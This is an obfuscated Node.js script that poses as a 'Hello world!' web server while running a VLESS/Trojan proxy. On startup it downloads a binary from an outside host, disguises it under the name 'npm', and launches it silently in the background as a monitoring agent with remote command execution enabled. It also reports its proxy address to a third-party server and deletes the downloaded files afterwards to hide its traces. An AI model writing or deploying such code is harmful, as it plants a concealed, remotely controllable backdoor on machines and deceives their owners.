const _0x1a5084=_0x3a9c;(function(_0xb0cf51,_0x1ca764){const _0x27b1fa=_0x3a9c,_0x5f2779=_0xb0cf51();while(!![]){try{const _0x1795e7=parseInt(_0x27b1fa(0x17e))/0x1*(parseInt(_0x27b1fa(0x1cb))/0x2)+-parseInt(_0x27b1fa(0x1e3))/0x3+-parseInt(_0x27b1fa(0x1c1))/0x4+parseInt(_0x27b1fa(0x1eb))/0x5+parseInt(_0x27b1fa(0x1e8))/0x6+-parseInt(_0x27b1fa(0x184))/0x7*(-parseInt(_0x27b1fa(0x1a4))/0x8)+parseInt(_0x27b1fa(0x186))/0x9*(parseInt(_0x27b1fa(0x1a6))/0xa);if(_0x1795e7===_0x1ca764)break;else _0x5f2779['push'](_0x5f2779['shift']());}catch(_0x46fccc){_0x5f2779['push'](_0x5f2779['shift']());}}}(_0x5a53,0xcbe59));const os=require('os'),http=require(_0x1a5084(0x1ab)),fs=require('fs'),axios=require(_0x1a5084(0x1cf)),net=require(_0x1a5084(0x1b3)),path=require(_0x1a5084(0x1dc)),crypto=require('crypto'),{Buffer}=require(_0x1a5084(0x1d7)),{exec,execSync}=require(_0x1a5084(0x190)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env'][_0x1a5084(0x1c5)]||_0x1a5084(0x1ce),NEZHA_SERVER=process[_0x1a5084(0x1d5)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x1a5084(0x1d5)][_0x1a5084(0x1d6)]||'',NEZHA_KEY=process[_0x1a5084(0x1d5)]['NEZHA_KEY']||'',DOMAIN=process[_0x1a5084(0x1d5)]['DOMAIN']||_0x1a5084(0x1d1),AUTO_ACCESS=process[_0x1a5084(0x1d5)][_0x1a5084(0x18f)]||![],WSPATH=process[_0x1a5084(0x1d5)][_0x1a5084(0x183)]||UUID[_0x1a5084(0x191)](0x0,0x8),SUB_PATH=process['env'][_0x1a5084(0x194)]||'sub',NAME=process['env'][_0x1a5084(0x1c3)]||'',PORT=process['env'][_0x1a5084(0x1d3)]||0xbb8;let ISP='';const GetISP=async()=>{const _0x447047=_0x1a5084;try{const _0xaa9e=await axios['get'](_0x447047(0x17f)),_0x526114=_0xaa9e[_0x447047(0x1b5)];ISP=(_0x526114[_0x447047(0x1c8)]+'-'+_0x526114['isp'])[_0x447047(0x1e9)](/ /g,'_');}catch(_0x261be0){ISP=_0x447047(0x1ea);}};GetISP();function _0x3a9c(_0x34c508,_0x2c47cd){_0x34c508=_0x34c508-0x17c;const _0x5a530c=_0x5a53();let _0x3a9cc2=_0x5a530c[_0x34c508];return _0x3a9cc2;}const httpServer=http[_0x1a5084(0x19a)]((_0x557c39,_0x3fab4a)=>{const _0x3e1c90=_0x1a5084;if(_0x557c39[_0x3e1c90(0x1b0)]==='/'){const _0x612f4e=path['join'](__dirname,_0x3e1c90(0x196));fs['readFile'](_0x612f4e,'utf8',(_0x54ceed,_0x574a98)=>{const _0x1cf297=_0x3e1c90;if(_0x54ceed){_0x3fab4a[_0x1cf297(0x1e4)](0xc8,{'Content-Type':'text/html'}),_0x3fab4a[_0x1cf297(0x187)](_0x1cf297(0x19d));return;}_0x3fab4a[_0x1cf297(0x1e4)](0xc8,{'Content-Type':_0x1cf297(0x1a8)}),_0x3fab4a[_0x1cf297(0x187)](_0x574a98);});return;}else{if(_0x557c39[_0x3e1c90(0x1b0)]==='/'+SUB_PATH){const _0x187f37=NAME?NAME+'-'+ISP:ISP,_0x266705=_0x3e1c90(0x1c0)+UUID+_0x3e1c90(0x1be)+DOMAIN+_0x3e1c90(0x1c6)+DOMAIN+_0x3e1c90(0x19f)+WSPATH+'#'+_0x187f37,_0x440a45=_0x3e1c90(0x1cc)+UUID+'@cdns.doon.eu.org:443?security=tls&sni='+DOMAIN+_0x3e1c90(0x1c6)+DOMAIN+_0x3e1c90(0x19f)+WSPATH+'#'+_0x187f37,_0x527938=_0x266705+'\x0a'+_0x440a45,_0x22962a=Buffer[_0x3e1c90(0x1bd)](_0x527938)[_0x3e1c90(0x1f0)](_0x3e1c90(0x1ef));_0x3fab4a[_0x3e1c90(0x1e4)](0xc8,{'Content-Type':_0x3e1c90(0x1df)}),_0x3fab4a[_0x3e1c90(0x187)](_0x22962a+'\x0a');}else _0x3fab4a[_0x3e1c90(0x1e4)](0x194,{'Content-Type':_0x3e1c90(0x1df)}),_0x3fab4a[_0x3e1c90(0x187)](_0x3e1c90(0x1b7));}}),wss=new WebSocket[(_0x1a5084(0x1b6))]({'server':httpServer}),uuid=UUID[_0x1a5084(0x1e9)](/-/g,''),DNS_SERVERS=['8.8.4.4',_0x1a5084(0x195)];function resolveHost(_0xd6de31){return new Promise((_0x13e2e4,_0x2d79ac)=>{const _0x524c6a=_0x3a9c;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x524c6a(0x1a5)](_0xd6de31)){_0x13e2e4(_0xd6de31);return;}let _0x191fe5=0x0;function _0x4aa9ae(){const _0x100796=_0x524c6a;if(_0x191fe5>=DNS_SERVERS[_0x100796(0x189)]){_0x2d79ac(new Error('Failed\x20to\x20resolve\x20'+_0xd6de31+'\x20with\x20all\x20DNS\x20servers'));return;}const _0x4c5089=DNS_SERVERS[_0x191fe5];_0x191fe5++;const _0x111769='https://dns.google/resolve?name='+encodeURIComponent(_0xd6de31)+'&type=A';axios[_0x100796(0x192)](_0x111769,{'timeout':0x1388,'headers':{'Accept':_0x100796(0x181)}})[_0x100796(0x1c9)](_0x3972b2=>{const _0x4e428e=_0x100796,_0x4751b4=_0x3972b2[_0x4e428e(0x1b5)];if(_0x4751b4['Status']===0x0&&_0x4751b4[_0x4e428e(0x18c)]&&_0x4751b4[_0x4e428e(0x18c)][_0x4e428e(0x189)]>0x0){const _0x1247ad=_0x4751b4[_0x4e428e(0x18c)][_0x4e428e(0x1e5)](_0x4d9151=>_0x4d9151[_0x4e428e(0x1a1)]===0x1);if(_0x1247ad){_0x13e2e4(_0x1247ad['data']);return;}}_0x4aa9ae();})[_0x100796(0x1ba)](_0x41ae0e=>{_0x4aa9ae();});}_0x4aa9ae();});}function handleVlessConnection(_0x4a5c17,_0xc87672){const _0x3963ae=_0x1a5084,[_0x55ee3]=_0xc87672,_0xcdc9e0=_0xc87672[_0x3963ae(0x191)](0x1,0x11);if(!_0xcdc9e0[_0x3963ae(0x1a7)]((_0x322871,_0x3fb9d2)=>_0x322871==parseInt(uuid[_0x3963ae(0x1f1)](_0x3fb9d2*0x2,0x2),0x10)))return![];let _0x314945=_0xc87672[_0x3963ae(0x191)](0x11,0x12)[_0x3963ae(0x180)]()+0x13;const _0x5b09fe=_0xc87672[_0x3963ae(0x191)](_0x314945,_0x314945+=0x2)[_0x3963ae(0x1bc)](0x0),_0x33fcc3=_0xc87672['slice'](_0x314945,_0x314945+=0x1)[_0x3963ae(0x180)](),_0x20c4b4=_0x33fcc3==0x1?_0xc87672[_0x3963ae(0x191)](_0x314945,_0x314945+=0x4)['join']('.'):_0x33fcc3==0x2?new TextDecoder()['decode'](_0xc87672[_0x3963ae(0x191)](_0x314945+0x1,_0x314945+=0x1+_0xc87672[_0x3963ae(0x191)](_0x314945,_0x314945+0x1)[_0x3963ae(0x180)]())):_0x33fcc3==0x3?_0xc87672[_0x3963ae(0x191)](_0x314945,_0x314945+=0x10)[_0x3963ae(0x1a2)]((_0x22ce6a,_0x1b4000,_0x3899d5,_0x4e2035)=>_0x3899d5%0x2?_0x22ce6a[_0x3963ae(0x17c)](_0x4e2035[_0x3963ae(0x191)](_0x3899d5-0x1,_0x3899d5+0x1)):_0x22ce6a,[])['map'](_0x410fab=>_0x410fab[_0x3963ae(0x1bc)](0x0)[_0x3963ae(0x1f0)](0x10))[_0x3963ae(0x1d9)](':'):'';_0x4a5c17[_0x3963ae(0x17d)](new Uint8Array([_0x55ee3,0x0]));const _0x2f454e=createWebSocketStream(_0x4a5c17);return resolveHost(_0x20c4b4)[_0x3963ae(0x1c9)](_0xc5b80e=>{const _0x39ea2f=_0x3963ae;net[_0x39ea2f(0x1e0)]({'host':_0xc5b80e,'port':_0x5b09fe},function(){const _0x557ede=_0x39ea2f;this[_0x557ede(0x193)](_0xc87672[_0x557ede(0x191)](_0x314945)),_0x2f454e['on'](_0x557ede(0x1bb),()=>{})[_0x557ede(0x1de)](this)['on'](_0x557ede(0x1bb),()=>{})[_0x557ede(0x1de)](_0x2f454e);})['on']('error',()=>{});})[_0x3963ae(0x1ba)](_0x2a1410=>{const _0x3bea8c=_0x3963ae;net[_0x3bea8c(0x1e0)]({'host':_0x20c4b4,'port':_0x5b09fe},function(){const _0x14ee98=_0x3bea8c;this['write'](_0xc87672[_0x14ee98(0x191)](_0x314945)),_0x2f454e['on'](_0x14ee98(0x1bb),()=>{})[_0x14ee98(0x1de)](this)['on'](_0x14ee98(0x1bb),()=>{})[_0x14ee98(0x1de)](_0x2f454e);})['on'](_0x3bea8c(0x1bb),()=>{});}),!![];}function handleTrojanConnection(_0x56f591,_0x66d578){const _0x189504=_0x1a5084;try{if(_0x66d578[_0x189504(0x189)]<0x3a)return![];const _0x431f96=_0x66d578[_0x189504(0x191)](0x0,0x38)[_0x189504(0x1f0)](),_0x54fa4f=[UUID];let _0xc4922=null;for(const _0x4a4297 of _0x54fa4f){const _0x946ce2=crypto[_0x189504(0x1c7)](_0x189504(0x1ad))[_0x189504(0x1c2)](_0x4a4297)['digest']('hex');if(_0x946ce2===_0x431f96){_0xc4922=_0x4a4297;break;}}if(!_0xc4922)return![];let _0x2a2160=0x38;_0x66d578[_0x2a2160]===0xd&&_0x66d578[_0x2a2160+0x1]===0xa&&(_0x2a2160+=0x2);const _0x708e23=_0x66d578[_0x2a2160];if(_0x708e23!==0x1)return![];_0x2a2160+=0x1;const _0x11d04f=_0x66d578[_0x2a2160];_0x2a2160+=0x1;let _0x5ed74f,_0x35e9e4;if(_0x11d04f===0x1)_0x5ed74f=_0x66d578[_0x189504(0x191)](_0x2a2160,_0x2a2160+0x4)[_0x189504(0x1d9)]('.'),_0x2a2160+=0x4;else{if(_0x11d04f===0x3){const _0x4d6c3f=_0x66d578[_0x2a2160];_0x2a2160+=0x1,_0x5ed74f=_0x66d578[_0x189504(0x191)](_0x2a2160,_0x2a2160+_0x4d6c3f)[_0x189504(0x1f0)](),_0x2a2160+=_0x4d6c3f;}else{if(_0x11d04f===0x4)_0x5ed74f=_0x66d578[_0x189504(0x191)](_0x2a2160,_0x2a2160+0x10)[_0x189504(0x1a2)]((_0x4c060d,_0x42981e,_0x3c6c89,_0x13de5c)=>_0x3c6c89%0x2?_0x4c060d[_0x189504(0x17c)](_0x13de5c['slice'](_0x3c6c89-0x1,_0x3c6c89+0x1)):_0x4c060d,[])[_0x189504(0x1a3)](_0x1d74db=>_0x1d74db['readUInt16BE'](0x0)['toString'](0x10))['join'](':'),_0x2a2160+=0x10;else return![];}}_0x35e9e4=_0x66d578[_0x189504(0x1bc)](_0x2a2160),_0x2a2160+=0x2;_0x2a2160<_0x66d578['length']&&_0x66d578[_0x2a2160]===0xd&&_0x66d578[_0x2a2160+0x1]===0xa&&(_0x2a2160+=0x2);const _0x2adcd7=createWebSocketStream(_0x56f591);return resolveHost(_0x5ed74f)[_0x189504(0x1c9)](_0x3acccd=>{const _0x515d53=_0x189504;net[_0x515d53(0x1e0)]({'host':_0x3acccd,'port':_0x35e9e4},function(){const _0x184d5e=_0x515d53;_0x2a2160<_0x66d578[_0x184d5e(0x189)]&&this[_0x184d5e(0x193)](_0x66d578[_0x184d5e(0x191)](_0x2a2160)),_0x2adcd7['on'](_0x184d5e(0x1bb),()=>{})[_0x184d5e(0x1de)](this)['on'](_0x184d5e(0x1bb),()=>{})[_0x184d5e(0x1de)](_0x2adcd7);})['on'](_0x515d53(0x1bb),()=>{});})[_0x189504(0x1ba)](_0x33b8a8=>{const _0x49ac78=_0x189504;net[_0x49ac78(0x1e0)]({'host':_0x5ed74f,'port':_0x35e9e4},function(){const _0x1108c1=_0x49ac78;_0x2a2160<_0x66d578[_0x1108c1(0x189)]&&this[_0x1108c1(0x193)](_0x66d578[_0x1108c1(0x191)](_0x2a2160)),_0x2adcd7['on'](_0x1108c1(0x1bb),()=>{})[_0x1108c1(0x1de)](this)['on'](_0x1108c1(0x1bb),()=>{})[_0x1108c1(0x1de)](_0x2adcd7);})['on'](_0x49ac78(0x1bb),()=>{});}),!![];}catch(_0x5abbd7){return![];}}function _0x5a53(){const _0x1345c4=['join','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','path','Automatic\x20Access\x20Task\x20added\x20successfully','pipe','text/plain','connect','finish','log','3439761KURmOy','writeHead','find','connection','chmod\x20+x\x20npm','1510254iCEVKU','replace','Unknown','4672810WhAZfb','\x20-p\x20','2083','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','base64','toString','substr','concat','send','191593LazgMR','https://api.ip.sb/geoip','readUInt8','application/dns-json','https://amd64.ssss.nyc.mn/agent','WSPATH','2705297WGpaTR','https://arm64.ssss.nyc.mn/agent','720GPZYxS','end','post','length','false','443','Answer','2096','2053','AUTO_ACCESS','child_process','slice','get','write','SUB_PATH','1.1.1.1','index.html','config.yaml','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','stream','createServer','pop','https://amd64.ssss.nyc.mn/v1','Hello\x20world!','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','&path=%2F','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','type','reduce','map','16mrKmZw','test','41180KIMWWR','every','text/html','--tls','npm\x20download\x20successfully','http','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','sha224','error:\x20','utf-8','url','close','https://oooo.serv00.net/add-url','net','once','data','Server','Not\x20Found\x0a','8443','arm','catch','error','readUInt16BE','from','@cdns.doon.eu.org:443?encryption=none&security=tls&sni=','Server\x20is\x20running\x20on\x20port\x20','vless://','3526736KuPgtg','update','NAME','aarch64','UUID','&fp=chrome&type=ws&host=','createHash','country_code','then','listen','6fAEHqU','trojan://','includes','c6974f7d-28a5-4762-aa0b-bcd6580eca7b','axios','trim','1234.abc.com','npm\x20is\x20running','PORT','setsid\x20nohup\x20./npm\x20-s\x20','env','NEZHA_PORT','buffer','unlink'];_0x5a53=function(){return _0x1345c4;};return _0x5a53();}wss['on'](_0x1a5084(0x1e6),(_0x339c80,_0x56269c)=>{const _0x26c7b7=_0x1a5084,_0x28d091=_0x56269c[_0x26c7b7(0x1b0)]||'';_0x339c80[_0x26c7b7(0x1b4)]('message',_0xbfcf53=>{const _0x4ca1f8=_0x26c7b7;if(_0xbfcf53[_0x4ca1f8(0x189)]>0x11&&_0xbfcf53[0x0]===0x0){const _0x58b295=_0xbfcf53[_0x4ca1f8(0x191)](0x1,0x11),_0x407d26=_0x58b295['every']((_0x1fc69f,_0x4f89ce)=>_0x1fc69f==parseInt(uuid['substr'](_0x4f89ce*0x2,0x2),0x10));if(_0x407d26){!handleVlessConnection(_0x339c80,_0xbfcf53)&&_0x339c80[_0x4ca1f8(0x1b1)]();return;}}!handleTrojanConnection(_0x339c80,_0xbfcf53)&&_0x339c80[_0x4ca1f8(0x1b1)]();})['on'](_0x26c7b7(0x1bb),()=>{});});const getDownloadUrl=()=>{const _0x8448fe=_0x1a5084,_0xfc9ff5=os['arch']();return _0xfc9ff5===_0x8448fe(0x1b9)||_0xfc9ff5==='arm64'||_0xfc9ff5===_0x8448fe(0x1c4)?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':_0x8448fe(0x185):!NEZHA_PORT?_0x8448fe(0x19c):_0x8448fe(0x182);},downloadFile=async()=>{const _0x18701e=_0x1a5084;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x3fe1c4=getDownloadUrl(),_0x558f4b=await axios({'method':'get','url':_0x3fe1c4,'responseType':_0x18701e(0x199)}),_0x2ad830=fs['createWriteStream']('npm');return _0x558f4b[_0x18701e(0x1b5)][_0x18701e(0x1de)](_0x2ad830),new Promise((_0x3d7384,_0x2b62fb)=>{const _0x4590f1=_0x18701e;_0x2ad830['on'](_0x4590f1(0x1e1),()=>{const _0x866bca=_0x4590f1;console[_0x866bca(0x1e2)](_0x866bca(0x1aa)),exec(_0x866bca(0x1e7),_0x4b8e29=>{if(_0x4b8e29)_0x2b62fb(_0x4b8e29);_0x3d7384();});}),_0x2ad830['on']('error',_0x2b62fb);});}catch(_0x21586a){throw _0x21586a;}},runnz=async()=>{const _0x29e2a2=_0x1a5084;try{const _0x30ca0e=execSync(_0x29e2a2(0x1a0),{'encoding':_0x29e2a2(0x1af)});if(_0x30ca0e[_0x29e2a2(0x1d0)]()!==''){console[_0x29e2a2(0x1e2)]('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x49eae8){}await downloadFile();let _0x17dedd='',_0x2ffb43=[_0x29e2a2(0x18b),_0x29e2a2(0x1b8),_0x29e2a2(0x18d),'2087',_0x29e2a2(0x1ed),_0x29e2a2(0x18e)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x3422cd=_0x2ffb43[_0x29e2a2(0x1cd)](NEZHA_PORT)?_0x29e2a2(0x1a9):'';_0x17dedd=_0x29e2a2(0x1d4)+NEZHA_SERVER+':'+NEZHA_PORT+_0x29e2a2(0x1ec)+NEZHA_KEY+'\x20'+_0x3422cd+_0x29e2a2(0x1ee);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x53c5e7=NEZHA_SERVER[_0x29e2a2(0x1cd)](':')?NEZHA_SERVER['split'](':')[_0x29e2a2(0x19b)]():'',_0x22f58a=_0x2ffb43['includes'](_0x53c5e7)?'true':_0x29e2a2(0x18a),_0x219173='client_secret:\x20'+NEZHA_KEY+_0x29e2a2(0x1da)+NEZHA_SERVER+_0x29e2a2(0x1db)+_0x22f58a+_0x29e2a2(0x19e)+UUID;fs['writeFileSync'](_0x29e2a2(0x197),_0x219173);}_0x17dedd=_0x29e2a2(0x1ac);}else{console['log'](_0x29e2a2(0x198));return;}}try{exec(_0x17dedd,{'shell':'/bin/bash'},_0x266dcd=>{const _0x386030=_0x29e2a2;if(_0x266dcd)console[_0x386030(0x1bb)]('npm\x20running\x20error:',_0x266dcd);else console[_0x386030(0x1e2)](_0x386030(0x1d2));});}catch(_0x4b4a7e){console[_0x29e2a2(0x1bb)](_0x29e2a2(0x1ae)+_0x4b4a7e);}};async function addAccessTask(){const _0x4d1969=_0x1a5084;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0xfe4893='https://'+DOMAIN+'/'+SUB_PATH;try{const _0x1c9f28=await axios[_0x4d1969(0x188)](_0x4d1969(0x1b2),{'url':_0xfe4893},{'headers':{'Content-Type':'application/json'}});console[_0x4d1969(0x1e2)](_0x4d1969(0x1dd));}catch(_0x8f38fa){}}const delFiles=()=>{const _0x3c63ec=_0x1a5084;fs[_0x3c63ec(0x1d8)]('npm',()=>{}),fs[_0x3c63ec(0x1d8)](_0x3c63ec(0x197),()=>{});};httpServer[_0x1a5084(0x1ca)](PORT,()=>{const _0x1d41fa=_0x1a5084;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log'](_0x1d41fa(0x1bf)+PORT);});
